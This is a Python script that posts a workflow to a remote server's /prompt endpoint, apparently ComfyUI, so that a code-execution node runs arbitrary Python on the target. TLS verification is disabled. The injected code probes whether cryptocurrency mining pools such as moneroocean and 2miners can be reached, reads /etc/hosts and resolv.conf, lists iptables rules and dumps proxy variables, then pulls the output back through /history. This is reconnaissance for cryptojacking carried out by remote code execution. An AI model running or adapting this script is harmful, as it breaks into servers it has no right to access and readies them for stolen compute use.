import json, urllib.request, ssl, sys, time

IP = sys.argv[1]
BASE = f"https://{IP}:443"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

code = """
import subprocess, socket
lines = []

# Check DNS resolution for the pool
pools = ['rvn.2miners.com', 'etchash.unmineable.com', 'gulf.moneroocean.stream']
for pool in pools:
    try:
        ips = socket.getaddrinfo(pool, None)
        resolved = set(a[4][0] for a in ips)
        lines.append(f'DNS {pool} -> {resolved}')
    except Exception as e:
        lines.append(f'DNS {pool} -> ERROR: {e}')

# Check /etc/hosts for overrides
try:
    with open('/etc/hosts', 'r') as f:
        hosts = f.read()
    for line in hosts.splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            lines.append(f'HOSTS: {line}')
except Exception as e:
    lines.append(f'hosts error: {e}')

# Check resolv.conf
try:
    with open('/etc/resolv.conf', 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                lines.append(f'RESOLV: {line}')
except Exception as e:
    lines.append(f'resolv error: {e}')

# Try direct TCP connect to pool
import socket as s
for host, port in [('rvn.2miners.com', 16060), ('etchash.unmineable.com', 3333)]:
    try:
        sock = s.create_connection((host, port), timeout=5)
        sock.close()
        lines.append(f'TCP {host}:{port} -> OK')
    except Exception as e:
        lines.append(f'TCP {host}:{port} -> FAIL: {e}')

# Check iptables output rules
try:
    r = subprocess.run(['iptables', '-L', 'OUTPUT', '-n', '--line-numbers'], capture_output=True, text=True, timeout=5)
    if r.returncode == 0:
        lines.append(f'IPTABLES OUTPUT: {r.stdout.strip()[:500]}')
    else:
        lines.append(f'iptables: {r.stderr.strip()[:200]}')
except Exception as e:
    lines.append(f'iptables: {e}')

# Check if there's a proxy configured
import os
for var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY']:
    val = os.environ.get(var)
    if val:
        lines.append(f'ENV {var}={val}')

result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"},
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]},
        },
    }
}

data = json.dumps(prompt).encode()
req = urllib.request.Request(f"{BASE}/prompt", data=data, headers={"Content-Type": "application/json"})
resp = urllib.request.urlopen(req, data, timeout=10, context=ctx)
pid = json.loads(resp.read().decode()).get("prompt_id", "")
print(f"[{IP}] prompt_id: {pid}")

time.sleep(15)

resp2 = urllib.request.urlopen(f"{BASE}/history/{pid}", timeout=10, context=ctx)
hist = json.loads(resp2.read().decode())
entry = hist.get(pid, {})
status = entry.get("status", {}).get("status_str", "pending")
print(f"[{IP}] status: {status}")
outputs = entry.get("outputs", {})
for nid, nout in outputs.items():
    for key, val in nout.items():
        if isinstance(val, list):
            for v in val:
                print(v)
        else:
            print(val)
msgs = entry.get("status", {}).get("messages", [])
for m in msgs:
    if m[0] == "execution_error":
        print(f"ERROR: {m[1].get('exception_type')}: {m[1].get('exception_message','')[:500]}")
